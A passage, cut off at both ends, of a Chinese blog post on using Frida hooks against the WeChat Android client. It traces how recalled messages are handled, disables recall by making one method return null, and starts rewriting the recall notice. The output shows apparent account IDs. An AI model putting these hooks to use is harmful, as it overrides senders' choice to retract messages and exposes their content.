class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;7 f.a()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.model.ch&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;6 ch.b()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.s.b&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5 b.b()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.messenger.foundation.c&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">processAddMsg</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;4 c.processAddMsg()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">processAddMsg</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.messenger.foundation.c&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;3 c.a()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.messenger.foundation.f&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;2 f.a()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.plugin.zero.c&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1 c.a()&quot;</span>, log_str);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现对方撤回消息打印如下信息：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span>c.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@<span class="number">83</span>a5410 [<span class="number">1</span>]false</span><br><span class="line"><span class="symbol">2 </span>f.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@<span class="number">83</span>a5410 [<span class="number">1</span>][object Object] [<span class="number">2</span>]false</span><br><span class="line"><span class="symbol">3 </span>c.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@<span class="number">83</span>a5410 [<span class="number">1</span>][object Object] [<span class="number">2</span>]false [<span class="number">3</span>][object Object]</span><br><span class="line"><span class="symbol">4 </span>c.processAddMsg() arguments: [<span class="number">0</span>]AddMsgInfo(<span class="number">181590793</span>), <span class="keyword">get</span>[false], fault[false], up[false] fixTime[<span class="number">0</span>] [<span class="number">1</span>][object Object]</span><br><span class="line"><span class="symbol">5 </span>b.b() arguments: [<span class="number">0</span>]AddMsgInfo(<span class="number">181590793</span>), <span class="keyword">get</span>[false], fault[false], up[false] fixTime[<span class="number">0</span>]</span><br><span class="line"><span class="symbol">6 </span>ch.b() arguments: [<span class="number">0</span>]AddMsgInfo(<span class="number">181590793</span>), <span class="keyword">get</span>[false], fault[false], up[false] fixTime[<span class="number">0</span>]</span><br><span class="line"><span class="symbol">7 </span>f.a() arguments: [<span class="number">0</span>]revokemsg [<span class="number">1</span>][object Object] [<span class="number">2</span>]AddMsgInfo(<span class="number">181590793</span>), <span class="keyword">get</span>[false], fault[false], up[false] fixTime[<span class="number">0</span>]</span><br><span class="line"><span class="symbol">8 </span>handleRevokeMsgBySvrId arguments: [<span class="number">0</span>]<span class="number">3286380964546034700</span></span><br></pre></td></tr></table></figure><p>对方发送消息打印如下信息：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span>c.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@df09a3a [<span class="number">1</span>]false</span><br><span class="line"><span class="symbol">2 </span>f.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@df09a3a [<span class="number">1</span>][object Object] [<span class="number">2</span>]false</span><br><span class="line"><span class="symbol">3 </span>c.a() arguments: [<span class="number">0</span>]<span class="keyword">com</span>.tencent.mm.protocal.protobuf.aaf@df09a3a [<span class="number">1</span>][object Object] [<span class="number">2</span>]false [<span class="number">3</span>][object Object]        </span><br><span class="line"><span class="symbol">4 </span>c.processAddMsg() arguments: [<span class="number">0</span>]AddMsgInfo(<span class="number">21726955</span>), <span class="keyword">get</span>[false], fault[false], up[false] fixTime[<span class="number">0</span>] [<span class="number">1</span>][object Object]</span><br></pre></td></tr></table></figure><p>发现确实有所区别，从processAddMsg()方法开始就不一样了，所以processAddMsg()方法算是一个关键，如果判断是撤回消息继续向下面执行，如果不是撤回消息就停在processAddMsg()方法了，跟进这个方法看看内容。</p><p><code>com.tencent.mm.plugin.messenger.foundation.c.processAddMsg</code>，按照上面打印的调用栈，下面可能会执行到<code>com.tencent.mm.s.b.b</code>方法，所以在processAddMsg()方法中找到如下位置：</p><p><img src="assets/image-20240611155113284.png" alt="image-20240611155113284"></p><p>发现是否进入下一个方法com.tencent.mm.s.b.b关键是bk值，而bk值好像是受到</p><p>**com.tencent.mm.ak.e bK = e.d.bK(Integer.valueOf(cvVar.vkP))**影响，这里可以关注一下cvVar.vkP值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">revoke_vkp</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.tencent.mm.protocal.protobuf.cv&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> vkP = obj.<span class="property">vkP</span>.<span class="property">value</span>;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(vkP);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对方发送消息 值为1</span></span><br><span class="line"><span class="comment">//对方撤回消息 值为10002</span></span><br></pre></td></tr></table></figure><p>所以猜测根据这个值来判断是否是撤回消息，是否要进入com.tencent.mm.s.b.b进行进一步处理。</p><p>因为要处理防撤回操作，所以进入<code>com.tencent.mm.s.b.b</code></p><p><img src="assets/image-20240611160534331.png" alt="image-20240611160534331"></p><p>这里有个神奇的地方，因为<code>com.tencent.mm.s.b.b</code>方法之后都是处理撤回消息的函数操作，把这里直接返回空是不是就不能执行撤回消息的操作了…</p><p>代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hook com.tencent.mm.s.b.b 实现返回空 则不会执行后序的撤回操作</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_bb</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.s.b&quot;</span>);</span><br><span class="line">        clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">a</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试发现对方确实不能撤回消息了 但是没有撤回提示 xxx撤回一条消息</span></span><br></pre></td></tr></table></figure><p>进入下一个方法看看</p><p><code>com.tencent.mm.model.ch.b</code></p><p><img src="assets/image-20240611161159927.png" alt="image-20240611161159927"></p><p>发现这里又对vkP进行了switch判断，vkP==10002,所以这里主要执行case 10002；</p><p><img src="assets/image-20240611162654619.png" alt="image-20240611162654619"></p><p>发现主要是对a2内容进行判断操作。a2=cvVar.GYI.IYz，这里就json化输出cvVar.GYI，然后cvVar.GYI作为参数调用了这个方法</p><p><img src="assets/image-20240611164521216.png" alt="image-20240611164521216"></p><p>可以打印一下deoVar.ITz看看内容，因为case 10002都是对其内容进行判断操作。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改撤回提示消息 打印json输出</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">revoke_msg</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> gson = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.model.ch&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;====================&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> v0 = <span class="title class_">Java</span>.<span class="title function_">cast</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>].<span class="property">gpg</span>.<span class="property">value</span>, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.protocal.protobuf.cv&quot;</span>));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(gson.$new().<span class="title function_">toJson</span>(v0)); <span class="comment">//json化输出 GYI</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">var</span> revoke_xml_obj = <span class="title class_">Java</span>.<span class="title function_">cast</span>(v0.<span class="property">GYI</span>.<span class="property">value</span>, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.protocal.protobuf.deo&quot;</span>));</span><br><span class="line">  </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(revoke_xml_obj.<span class="property">IYz</span>.<span class="property">value</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;====================&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;6 ch.b()&quot;</span>, log_str);</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印内容如下：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;CreateTime&quot;</span>:<span class="number">1718094764</span>,</span><br><span class="line"><span class="string">&quot;GYG&quot;</span>:&#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;wxid_0wk809ov49tq22&quot;</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;GYH&quot;</span>:&#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;wxid_5yg9b4aw7fo422&quot;</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;GYI&quot;</span>:&#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;<span class="char escape_">\u</span>003csysmsg type<span class="char escape_">\u</span>003d<span class="char escape_">\&quot;</span>revokemsg<span class="char escape_">\&quot;</span><span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003crevokemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003csession<span class="char escape_">\u</span>003ewxid_0wk809ov49tq22<span class="char escape_">\u</span>003c/session<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cmsgid<span class="char escape_">\u</span>003e1632163924<span class="char escape_">\u</span>003c/msgid<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cnewmsgid<span class="char escape_">\u</span>003e5211977936516039943<span class="char escape_">\u</span>003c/newmsgid<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003creplacemsg<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c![CDATA[<span class="char escape_">\&quot;</span>G08aT<span class="char escape_">\&quot;</span> 撤回了一条消息]]<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c/replacemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003c/revokemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\u</span>003c/sysmsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span>&quot;</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;GYJ&quot;</span>:<span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;GYK&quot;</span>:&#123;<span class="string">&quot;hasBuffer&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;hasILen&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;iLen&quot;</span>:<span class="number">0</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;GYL&quot;</span>:<span class="string">&quot;<span class="char escape_">\u</span>003cmsgsource<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003ctmp_node<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cpublisher-id<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c/publisher-id<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003c/tmp_node<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\u</span>003c/msgsource<span class="char escape_">\u</span>003e<span class="char escape_">\n</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;GYN&quot;</span>:<span class="number">801938977</span>,</span><br><span class="line"><span class="string">&quot;nNf&quot;</span>:<span class="number">3</span>,</span><br><span class="line"><span class="string">&quot;vkP&quot;</span>:<span class="number">10002</span>,</span><br><span class="line"><span class="string">&quot;ysP&quot;</span>:<span class="number">1632163925</span>,</span><br><span class="line"><span class="string">&quot;ysR&quot;</span>:<span class="number">679760550</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>:[],<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">//</span>IYz内容</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>sysmsg type<span class="operator">=</span><span class="string">&quot;revokemsg&quot;</span><span class="operator">&gt;</span></span><br><span class="line">        <span class="symbol">&lt;revokemsg&gt;</span></span><br><span class="line">                <span class="symbol">&lt;session&gt;</span>wxid_0wk809ov49tq22<span class="operator">&lt;</span><span class="operator">/</span>session<span class="operator">&gt;</span></span><br><span class="line">                <span class="symbol">&lt;msgid&gt;</span><span class="number">1632163924</span><span class="operator">&lt;</span><span class="operator">/</span>msgid<span class="operator">&gt;</span></span><br><span class="line">                <span class="symbol">&lt;newmsgid&gt;</span><span class="number">5211977936516039943</span><span class="operator">&lt;</span><span class="operator">/</span>newmsgid<span class="operator">&gt;</span></span><br><span class="line">                <span class="symbol">&lt;replacemsg&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>[CDATA[<span class="string">&quot;G08aT&quot;</span> 撤回了一条消息]]<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>replacemsg<span class="operator">&gt;</span></span><br><span class="line">        <span class="operator">&lt;</span><span class="operator">/</span>revokemsg<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span>sysmsg<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>这里就可以修改一下撤回消息提示的提示内容，把<replacemsg>内容替换一下</p><p>代码如下</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">revoke_msg</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> gson = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.model.ch&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> v0 = <span class="title class_">Java</span>.<span class="title function_">cast</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>].<span class="property">gpg</span>.<span class="property">value</span>, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.protocal.protobuf.cv&quot;</span>));</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">function</span> <span class="title function_">modify_revoke_str</span>(<span class="params">old_revoke_str</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> message = <span class="string">&quot;尝试撤回了一条消息&quot;</span>;  <span class="comment">//要替换的内容</span></span><br><span class="line">                <span class="keyword">var</span> revoke_msg = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(message);</span><br><span class="line">                <span class="keyword">var</span> sub_str = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;]]&gt;&lt;/replacemsg&gt;&quot;</span>)</span><br><span class="line">                <span class="keyword">var</span> index = 